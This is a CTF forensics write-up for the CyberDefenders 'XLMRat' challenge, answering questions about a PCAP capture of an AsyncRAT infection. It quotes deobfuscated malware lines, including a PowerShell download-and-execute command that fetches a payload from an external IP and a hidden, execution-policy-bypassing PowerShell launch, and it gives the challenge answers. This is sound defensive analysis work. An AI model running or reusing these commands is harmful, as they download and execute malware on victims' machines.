challenge_link > https://cyberdefenders.org/blueteam-ctf-challenges/xlmrat/

challenge_difficulty > Easy

challenge_givenfiles > 236-XLMRat.pcap

tools_used > wireshark, strings, virustotal

challenge_scenario > A compromised machine has been flagged due to suspicious network traffic. Your task is to analyze the PCAP file to determine the attack method, identify any malicious payloads, and trace the timeline of events. Focus on how the attacker gained access, what tools or techniques were used, and how the malware operated post-compromise.
--------------------------------
        challenge_questions
                |
                |
                

Q1 >
-The attacker successfully executed a command to download the first stage of the malware. What is the URL from which the first malware stage was installed?

after exporting the two files from pcap file in wireshark and run strings in the xml.txt then bring the obfuscationed data to thier origin we will see that it download the http://45.126.209.4:222/mdm.jpg

so answer :
    http://45.126.209.4:222/mdm.jpg

Q2 >
-Which hosting provider owns the associated IP address?

after using ip lookup website:

    reliableSite.net

Q3 >
-By analyzing the malicious scripts, two payloads were identified: a loader and a secondary executable. What is the SHA256 of the malware executable?

        starting by anlayzing the file with wireshark i identified http requests contain downloading 2 files mdm.jpg, xml.txt i exported them in wireshark by 
        file > export objects > HTTP > download the files

    then run strings on them

    the xml.txt conatin some obfuscationed data like LZeWX(0) = "[B", LZeWX(1) = "YT", LZeWX(2) = "e[" after return them to its origin it make will be like
        IEX(New-Object Net.WebClient).DOWNLOAD
        http://45.126.209.4:222/mdm.jpg
        objShell.Run "Cmd.exe /c POWeRSHeLL.eXe -NOP -WIND HIDDeN -eXeC BYPASS -NONI " & OodjR, 0, True

        so i will follow it because we have the second file which is mdm.jpg


    the strings showed many info for its workflow like:
        hexString_bbb (hex_data) (executable) > split > to bytes > run it
        hexString_pe (hex_data) (loader)

        so here we will need the hexString_bbb and replace the "_" with "" then convert it from_hex then calculate the sha256sum
        the python code will be attached that solve this one


    answeris:
        1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798
Q4 >
-What is the malware family label based on Alibaba?

    after we identefied the sha256 we must search for the hash in virustotal or any similair website to know its family

    answer is:
        asyncrat

Q5 >
-What is the PE header compile (Creation Time) timestamp of the malware?

    in the details section in virustotal > Compilation Timestamp : 2023-10-30 15:08:44 UTC 

    we just need 2023-10-30 15:08
    answer is :
        2023-10-30 15:08

Q6 >
-Which LOLBin is leveraged for stealthy process execution in this script? Provide the full path.

    also here are some weak obfuscatetion the two texts are like C:/W#######indow all we need to do is replacing the # to "" and combine the two together the texts are in the strings mdm.jpg 
    the python code solve this question
    answer is:
        C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe

Q7 >
-The script is designed to drop several files. List the names of the files dropped by the script.
    
    here you need some patient and read the strings from mdm.jpg there are 3 files that being dropped
    
    answer is:
        Conted.ps1,Conted.bat,Conted.vbs



















--------------------------------